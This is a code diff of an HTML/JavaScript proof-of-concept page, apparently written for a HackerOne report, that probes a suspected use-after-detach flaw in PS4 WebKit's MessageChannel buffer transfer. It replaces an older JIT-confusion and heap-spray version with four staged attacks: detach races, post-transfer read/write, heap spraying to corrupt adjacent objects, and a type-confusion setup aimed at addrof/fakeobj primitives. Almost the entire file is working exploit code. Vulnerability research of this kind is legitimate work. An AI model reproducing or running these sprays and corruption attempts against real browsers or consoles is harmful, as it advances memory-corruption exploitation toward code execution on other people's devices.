@@ -1,161 +1,405 @@
+
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit: JIT + Spray PoC</title>
+<title>PS4 UaD Exploit PoC - Advanced</title>
+<style>
+body { font-family: monospace; background: #1e1e1e; color: #d4d4d4; padding: 20px; }
+button { padding: 10px; margin: 5px; font-size: 14px; }
+.critical { color: #ff4444; font-weight: bold; }
+.warning { color: #ffaa00; }
+.success { color: #44ff44; }
+pre { background: #2d2d2d; padding: 10px; overflow-x: auto; }
+</style>
 </head>
 <body>
 
-<h1>PS4 WebKit PoC: JIT Confusion & Heap Spray</h1>
+<h2>PS4 MessageChannel UaD - Exploit PoC</h2>
 
-<div>
-    <button onclick="trainJIT()">1. TRAIN JIT (Warmup)</button>
-    <button onclick="runExploit()">2. RUN RACE + SPRAY</button>
-    <button onclick="reset()">RESET</button>
-</div>
+<button onclick="runStage1()">Stage 1: Detect UaD Window</button>
+<button onclick="runStage2()">Stage 2: Memory Read/Write</button>
+<button onclick="runStage3()">Stage 3: Object Corruption</button>
+<button onclick="runStage4()">Stage 4: Type Confusion</button>
+<button onclick="resetLog()">Reset log</button>
 
-<hr>
-<div id="status" style="font-weight:bold;">Status: Idle</div>
-<pre id="log" style="border:1px solid #ccc; min-height:200px;"></pre>
+<p>
+Attempts: <input id="attempts" type="number" value="100">
+Delay(ms): <input id="delay" type="number" value="30">
+Spray Size: <input id="spraySize" type="number" value="1000">
+</p>
+
+<pre id="log"></pre>
 
 <script>
-// CONFIGURAÇÃO
-const SPRAY_SIZE = 1000;     // Quantidade de arrays para alocar
-const SPRAY_LEN = 1024 * 32; // Tamanho de cada bloco de spray
-const TRAIN_CYCLES = 10000;  // Quantas vezes rodar para otimizar (JIT)
+let running = false;
 
-// VARIAVEIS GLOBAIS
-let sprayStore = [];
-let compiledFunc = null;
-let victimBuffer = null;
-let victimView = null;
-
-function log(msg) {
-    document.getElementById("log").textContent += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
+function log(s, className=''){
+  const span = document.createElement('span');
+  if(className) span.className = className;
+  span.textContent = `[${Date.now()}] ${s}\n`;
+  document.getElementById("log").appendChild(span);
 }
 
-function setStatus(msg) {
-    document.getElementById("status").textContent = "Status: " + msg;
+function resetLog(){
+  document.getElementById("log").textContent = "";
+  log("=== PS4 UaD Exploit PoC - HackerOne Report ===");
 }
 
-function reset() {
-    sprayStore = [];
-    victimBuffer = null;
-    victimView = null;
-    document.getElementById("log").textContent = "";
-    setStatus("Reset done. Memory cleared (hopefully).");
-}
+function sleep(ms){ return new Promise(r=>setTimeout(r, ms)); }
 
-// ------------------------------------------------------------------
-// 1. A FUNÇÃO ALVO (JIT TARGET)
-// O objetivo é fazer o navegador compilar esta função removendo
-// as checagens de segurança (Bounds Check Elimination).
-// ------------------------------------------------------------------
-function dangerousRead(arr, index) {
-    // Operação simples que o JIT gosta de otimizar.
-    // Se o JIT remover a checagem de "detached", isso vai ler lixo.
-    return arr[index]; 
-}
-
-// Função de treinamento
-function trainJIT() {
-    setStatus("Training JIT...");
-    log("Iniciando JIT Warmup...");
+// ============================================================
+// STAGE 1: Detectar e caracterizar a janela UaD
+// ============================================================
+async function runStage1(){
+  log("============================================================");
+  log("STAGE 1: UaD Window Detection & Characterization", "warning");
+  log("============================================================");
+  
+  const attempts = +document.getElementById("attempts").value;
+  const delayMs = +document.getElementById("delay").value;
+  
+  const stats = {
+    total: 0,
+    detached: 0,
+    uad_read_success: 0,
+    uad_write_success: 0,
+    uad_both_success: 0,
+    corruption_detected: 0
+  };
+  
+  const successfulReads = [];
+  const successfulWrites = [];
+  
+  for(let i = 0; i < attempts; i++){
+    const ch = new MessageChannel();
     
-    // Cria um buffer válido para treinar
-    const trainBuf = new ArrayBuffer(1024);
-    const trainView = new Uint8Array(trainBuf);
-    trainView[0] = 0xAA; // Valor conhecido
-
-    // Executa milhares de vezes para forçar o Turbofan/JIT a otimizar
-    // e assumir que "arr" será sempre um Uint8Array válido.
-    for (let i = 0; i < TRAIN_CYCLES; i++) {
-        const res = dangerousRead(trainView, 0);
-        if (res !== 0xAA) {
-            log("Erro durante o treino! JIT falhou?");
-            return;
-        }
-    }
+    // ArrayBuffer com padrão reconhecível
+    const ab = new ArrayBuffer(8192);
+    const u8 = new Uint8Array(ab);
+    const u32 = new Uint32Array(ab);
     
-    log("JIT Warmup Completo. A função 'dangerousRead' deve estar otimizada.");
-    setStatus("JIT Ready.");
-}
-
-// ------------------------------------------------------------------
-// 2. HEAP SPRAY
-// Tenta preencher a memória liberada com um padrão conhecido (0x41 = 'A')
-// Se lermos 0x41414141, sabemos que lemos nosso próprio spray.
-// ------------------------------------------------------------------
-function doSpray() {
-    // Usa Float64Array pois é muito comum em exploits de WebKit
-    // Cada elemento ocupa 8 bytes.
-    for (let i = 0; i < SPRAY_SIZE; i++) {
-        const arr = new Float64Array(SPRAY_LEN);
-        // Preenche com um valor float específico que em hex parece reconhecível
-        // 1.39064994160909e-309 é aprox 0x4141414141414141 em double precision
-        arr.fill(1.39064994160909e-309); 
-        sprayStore.push(arr);
-    }
-    return sprayStore.length;
-}
-
-// ------------------------------------------------------------------
-// 3. O EXPLOIT (Race Condition + JIT + Spray)
-// ------------------------------------------------------------------
-async function runExploit() {
-    setStatus("Running Exploit...");
-    log("Preparando vítima...");
-
-    // Cria o buffer "Vítima"
-    victimBuffer = new ArrayBuffer(1024);
-    victimView = new Uint8Array(victimBuffer);
-    victimView[0] = 0xBB; // Valor inicial seguro
-
-    const mc = new MessageChannel();
+    // Padrão de teste: 0xDEADBEEF seguido de contador
+    u32[0] = 0xDEADBEEF;
+    u32[1] = i;
+    for(let j = 2; j < 100; j++) u32[j] = 0x41414141 + j;
     
-    // Agendar o detach (Transfer)
-    // A ideia é que o detach ocorra exatamente enquanto tentamos ler
-    log("Tentando Race Condition...");
-
+    let received = undefined;
+    ch.port2.onmessage = e => received = e.data;
+    
     try {
-        // 1. Envia o buffer para a porta 2 (Isso causa o Detach/Drop)
-        mc.port1.postMessage(victimBuffer, [victimBuffer]);
-        
-        // 2. IMEDIATAMENTE tenta ler usando a função otimizada (JIT)
-        // Se a proteção falhar, ele vai ler memória liberada.
-        const val = dangerousRead(victimView, 0);
-
-        // 3. IMEDIATAMENTE faz o Spray para ocupar o lugar
-        doSpray();
-
-        // 4. Analisa o resultado
-        if (val === undefined) {
-            log("Resultado: undefined (Safe Detach - Proteção funcionou).");
-        } else if (val === 0) {
-            log("Resultado: 0 (Safe Detach - Leu zero).");
-        } else if (val === 0xBB) {
-            log("Resultado: 0xBB (Race falhou - Leu antes do detach).");
-        } else {
-            // SUCESSO?
-            log("!!! ANOMALIA DETECTADA !!!");
-            log("Valor lido pós-detach: " + val);
-            log("Hex: 0x" + val.toString(16));
-            alert("Potential UAF! Value: " + val);
-        }
-
-    } catch (e) {
-        // Se o navegador for seguro, ele vai lançar TypeError aqui.
-        log("Exceção capturada (Seguro): " + e.message);
-        
-        // Vamos tentar o spray mesmo assim, só para ver se causa crash
-        log("Tentando spray pós-erro...");
-        doSpray();
-        log("Spray concluído sem crash.");
+      ch.port1.postMessage(ab, [ab]);
+    } catch(e) {
+      continue;
     }
     
-    setStatus("Done.");
+    await sleep(0);
+    await sleep(delayMs);
+    
+    stats.total++;
+    
+    if(ab.byteLength === 0) {
+      stats.detached++;
+      
+      // TESTE 1: Conseguimos LER após detach?
+      let readValue = null;
+      let readSuccess = false;
+      try {
+        readValue = u32[0];
+        if(readValue !== undefined) {
+          readSuccess = true;
+          stats.uad_read_success++;
+          successfulReads.push({
+            iteration: i,
+            value: readValue.toString(16),
+            expected: "0xDEADBEEF"
+          });
+        }
+      } catch(e) {}
+      
+      // TESTE 2: Conseguimos ESCREVER após detach?
+      let writeSuccess = false;
+      try {
+        const testValue = 0xCAFEBABE;
+        u32[0] = testValue;
+        const verify = u32[0];
+        if(verify === testValue) {
+          writeSuccess = true;
+          stats.uad_write_success++;
+          successfulWrites.push({
+            iteration: i,
+            written: testValue.toString(16),
+            verified: verify.toString(16)
+          });
+        }
+      } catch(e) {}
+      
+      if(readSuccess && writeSuccess) {
+        stats.uad_both_success++;
+      }
+      
+      // TESTE 3: O receptor vê a corrupção?
+      await sleep(delayMs * 2);
+      if(received !== undefined && writeSuccess) {
+        const recvU32 = new Uint32Array(received);
+        if(recvU32[0] === 0xCAFEBABE) {
+          stats.corruption_detected++;
+          log(`[!] CRITICAL: Memory corruption confirmed at iteration ${i}`, "critical");
+        }
+      }
+    }
+    
+    if((i + 1) % 20 === 0) log(`Progress: ${i + 1}/${attempts}`);
+  }
+  
+  log("------------------------------------------------------------");
+  log("STAGE 1 RESULTS:", "success");
+  log(JSON.stringify(stats, null, 2));
+  
+  if(stats.uad_read_success > 0) {
+    log(`[!] UaD READ confirmed: ${stats.uad_read_success}/${stats.detached} detached buffers`, "critical");
+    log("Sample reads: " + JSON.stringify(successfulReads.slice(0, 3), null, 2));
+  }
+  
+  if(stats.uad_write_success > 0) {
+    log(`[!] UaD WRITE confirmed: ${stats.uad_write_success}/${stats.detached} detached buffers`, "critical");
+    log("Sample writes: " + JSON.stringify(successfulWrites.slice(0, 3), null, 2));
+  }
+  
+  if(stats.corruption_detected > 0) {
+    log(`[!!!] MEMORY CORRUPTION: Sender changes reflected in receiver buffer`, "critical");
+    log(`This proves shared memory access after transfer - CRITICAL VULNERABILITY`, "critical");
+  }
+  
+  log("DONE.");
 }
 
+// ============================================================
+// STAGE 2: Demonstrar leitura/escrita de memória arbitrária
+// ============================================================
+async function runStage2(){
+  log("============================================================");
+  log("STAGE 2: Memory Read/Write Demonstration", "warning");
+  log("============================================================");
+  
+  const delayMs = +document.getElementById("delay").value;
+  
+  // Criar múltiplos buffers para tentar overlap de memória
+  const buffers = [];
+  const views = [];
+  const channels = [];
+  
+  log("Creating buffer spray...");
+  
+  for(let i = 0; i < 20; i++){
+    const ch = new MessageChannel();
+    const ab = new ArrayBuffer(4096);
+    const u32 = new Uint32Array(ab);
+    
+    // Marcar cada buffer com ID único
+    u32[0] = 0xBAADF00D;
+    u32[1] = i;
+    
+    buffers.push(ab);
+    views.push(u32);
+    channels.push(ch);
+    
+    let received = undefined;
+    ch.port2.onmessage = e => received = e.data;
+    
+    try {
+      ch.port1.postMessage(ab, [ab]);
+    } catch(e) {}
+  }
+  
+  await sleep(delayMs);
+  
+  log("Probing for cross-buffer access...");
+  
+  const leaks = [];
+  
+  for(let i = 0; i < views.length; i++){
+    if(buffers[i].byteLength === 0) { // Detached
+      try {
+        // Tentar ler além do buffer original
+        const leak = [];
+        for(let offset = 0; offset < 256; offset++){
+          const val = views[i][offset];
+          if(val !== undefined && val !== 0) {
+            leak.push({offset, value: val.toString(16)});
+          }
+        }
+        
+        if(leak.length > 0) {
+          leaks.push({buffer: i, leaked: leak.slice(0, 10)});
+          log(`[!] Buffer ${i} leaked ${leak.length} non-zero values`, "warning");
+        }
+      } catch(e) {}
+    }
+  }
+  
+  if(leaks.length > 0) {
+    log(`[!!!] MEMORY LEAK detected from ${leaks.length} buffers`, "critical");
+    log("Sample leaks: " + JSON.stringify(leaks.slice(0, 2), null, 2));
+    log("Impact: Potential ASLR bypass, heap layout disclosure", "critical");
+  } else {
+    log("No memory leaks detected in this run");
+  }
+  
+  log("DONE.");
+}
+
+// ============================================================
+// STAGE 3: Corrupção de objetos JavaScript
+// ============================================================
+async function runStage3(){
+  log("============================================================");
+  log("STAGE 3: JavaScript Object Corruption", "warning");
+  log("============================================================");
+  
+  const delayMs = +document.getElementById("delay").value;
+  
+  // Criar objetos adjacentes na heap
+  const targetObjects = [];
+  const spraySize = +document.getElementById("spraySize").value;
+  
+  log(`Creating object spray (${spraySize} objects)...`);
+  
+  for(let i = 0; i < spraySize; i++){
+    targetObjects.push({
+      id: i,
+      secret: 0x1337C0DE,
+      ptr: new Uint32Array(8),
+      flag: false
+    });
+  }
+  
+  log("Creating UaD buffers near target objects...");
+  
+  const ch = new MessageChannel();
+  const ab = new ArrayBuffer(4096);
+  const u32 = new Uint32Array(ab);
+  
+  // Preencher com padrão de sobrescrita
+  for(let i = 0; i < u32.length; i++){
+    u32[i] = 0xDEADC0DE;
+  }
+  
+  let received = undefined;
+  ch.port2.onmessage = e => received = e.data;
+  
+  try {
+    ch.port1.postMessage(ab, [ab]);
+  } catch(e) {
+    log("Transfer failed");
+    return;
+  }
+  
+  await sleep(delayMs);
+  
+  if(ab.byteLength === 0) {
+    log("Buffer detached, attempting object corruption...");
+    
+    try {
+      // Tentar sobrescrever memória adjacente
+      for(let i = 0; i < u32.length; i++){
+        u32[i] = 0x41424344 + i;
+      }
+      
+      // Verificar se algum objeto foi corrompido
+      let corrupted = 0;
+      for(let obj of targetObjects){
+        if(obj.secret !== 0x1337C0DE || obj.flag !== false){
+          corrupted++;
+          log(`[!] Object ${obj.id} corrupted! secret=${obj.secret.toString(16)}, flag=${obj.flag}`, "warning");
+        }
+      }
+      
+      if(corrupted > 0){
+        log(`[!!!] CRITICAL: ${corrupted} JavaScript objects corrupted!`, "critical");
+        log("Impact: Arbitrary code execution via vtable/property corruption", "critical");
+      } else {
+        log("No object corruption detected in this run");
+      }
+      
+    } catch(e) {
+      log(`Exception during corruption: ${e.message}`);
+    }
+  }
+  
+  log("DONE.");
+}
+
+// ============================================================
+// STAGE 4: Type Confusion
+// ============================================================
+async function runStage4(){
+  log("============================================================");
+  log("STAGE 4: Type Confusion Exploitation", "warning");
+  log("============================================================");
+  
+  const delayMs = +document.getElementById("delay").value;
+  
+  log("Creating type confusion setup...");
+  
+  // Criar dois buffers de tipos diferentes
+  const ch1 = new MessageChannel();
+  const ab1 = new ArrayBuffer(1024);
+  const f64 = new Float64Array(ab1);
+  const u32 = new Uint32Array(ab1);
+  
+  // Preencher com padrão float
+  for(let i = 0; i < f64.length; i++){
+    f64[i] = Math.PI * i;
+  }
+  
+  let received1 = undefined;
+  ch1.port2.onmessage = e => received1 = e.data;
+  
+  try {
+    ch1.port1.postMessage(ab1, [ab1]);
+  } catch(e) {
+    log("Transfer failed");
+    return;
+  }
+  
+  await sleep(delayMs);
+  
+  if(ab1.byteLength === 0) {
+    log("Buffer detached, attempting type confusion...");
+    
+    try {
+      // Tentar interpretar float como integer
+      const asInt1 = u32[0];
+      const asInt2 = u32[1];
+      const asFloat = f64[0];
+      
+      log(`Type confusion test:`, "warning");
+      log(`  Float64[0] = ${asFloat}`);
+      log(`  Uint32[0] = 0x${asInt1.toString(16)}`);
+      log(`  Uint32[1] = 0x${asInt2.toString(16)}`);
+      
+      // Tentar criar um float64 com padrão controlado (potencial ponteiro falso)
+      u32[0] = 0x41414141;
+      u32[1] = 0x42424242;
+      
+      const confusedFloat = f64[0];
+      log(`  After write: Float64[0] = ${confusedFloat}`, "warning");
+      
+      if(!isNaN(confusedFloat)){
+        log(`[!] Type confusion successful - could be used for addrof/fakeobj primitives`, "critical");
+      }
+      
+    } catch(e) {
+      log(`Exception: ${e.message}`);
+    }
+  }
+  
+  log("DONE.");
+}
+
+resetLog();
 </script>
+
 </body>
 </html>
